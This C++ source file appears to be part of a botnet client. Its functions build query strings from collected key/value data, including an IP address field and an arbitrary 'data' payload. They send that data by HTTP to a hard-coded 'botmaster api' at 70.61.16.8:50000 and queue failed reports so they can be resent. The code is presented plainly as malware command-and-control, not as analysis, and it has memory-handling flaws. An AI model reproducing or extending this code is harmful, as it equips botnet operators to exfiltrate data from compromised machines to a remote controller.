#include <string>
#include <vector>
#include "UtilLib.h"
#include "HttpLib.h"

#pragma comment (lib, "Wininet.lib")

//converts a string to a w-string
wstring s2ws(string inString){
	wstring wString;
	return wString.assign(inString.begin(), inString.end());
}

//adds an unsuccessful request to the queue of requests that need to be resent
void queueRequest(vector<vector<string>> &requestQueue, string api, string query){
	vector<string> request = { api, query };
	requestQueue.push_back(request);
}

//returns the size of a vector
int getSize(vector<string> keys){
	return keys.size();
}

//returns the size of a vector<vector>
int getSize(vector<vector<string>> keys){
	return keys.size();
}

//converts a list of key/values to a query string
void convertArgsToStr(vector<string> keys, vector<string> values, int arrayLen, char** output, bool getRequest){
	// use this variable size string to construct the query
	string query = "";

	if (getRequest && arrayLen > 0)
		query += "?";
	for (int i = 0; i < arrayLen; i++){
		query += keys[i];
		query += "=" + values[i];
		if (i < arrayLen - 1)
			query += "&";
	}
	// initialize the array pointer that was passed in to fit the query string created plus space for \0
	*output = new char[query.length() + 1];
	// copy the string to the new array pointer 
	strncpy_s(*output, strlen(query.c_str()) + 1, query.c_str(), _TRUNCATE);
}

//searches a list of key/values for a set of specific key/value pairs
void getArgsToString(vector<string> keys, vector<string> values, int length, vector<string> params, int paramLength, char* verb, char** output){
	vector<string> tempKeys;
	vector<string> tempValues;
	int tempSize = 0;
	bool mac_address = false;
	//loop through the params we want
	for (int i = 0; i < paramLength; i++){
		//loop through all params
		for (int j = 0; j < length; j++){
			//param is found
			if (keys[j].compare(params[i])==0){
				//add to query key/value list
				tempKeys.push_back(keys[j]);
				tempValues.push_back(values[j]);
				tempSize++;
			}
			//ip address [optional] is found
			else if (keys[j].compare("ip_address") == 0 && !mac_address){
				tempKeys.push_back(keys[j]);
				tempValues.push_back(values[j]);
				tempSize++;
				mac_address = true;
			}
		}
	}
	//correct optional parameter being added
	if (mac_address){ paramLength++; }
	//number found and param count are the same
	if (paramLength != tempSize){
		string error = "err";
		// initialize the array pointer that was passed in to fit the query string created plus space for \0
		*output = new char[error.length() + 1];
		// copy the string to the new array pointer 
		strncpy_s(*output, strlen(error.c_str()) + 1, error.c_str(), _TRUNCATE);
	}
	else{
		//build get query
		if (strcmp(verb, "GET")==0)			convertArgsToStr(tempKeys, tempValues, tempSize, output, true);
		//build post query
		else if (strcmp(verb, "POST")==0)	convertArgsToStr(tempKeys, tempValues, tempSize, output, false);
	}
}

//sends a post request to the botmaster api
void sendP_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, vector<string> params, string api, string data){
	char* query = NULL;
	if (data.compare("")){
		params.push_back("data");
		keys.push_back("data");
		values.push_back(data);
	}
	getArgsToString(keys, values, getSize(keys), params, getSize(params), "POST", &query);
	if (strcmp(query, "err") != 0){
		char* postRes = httpPostRequest("70.61.16.8", api, 50000, query);
		if (strcmp(postRes, "") == 0){
			string requestParams = "";
			requestParams.append(query);
			queueRequest(requestQueue, api, requestParams);
		}
		delete[] postRes;
	}
}

//sends a get request to the botmaster api
char* sendG_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, vector<string> params, string api){
	char* query = NULL;
	getArgsToString(keys, values, getSize(keys), params, getSize(params), "GET", &query);
	if (strcmp(query, "err") != 0){
		char* getRes = httpGetRequest("70.61.16.8", api, 50000, query);
		if (strcmp(getRes,"") == 0){
			string requestParams = "";
			requestParams.append(query);
			queueRequest(requestQueue, api, requestParams);
			char * down = "down";
			delete[] getRes;
			delete[] query;
			return down;
		}
		return getRes;
	}
	else{
		char* err = "err";
		delete[] query;
		return err;
	}
}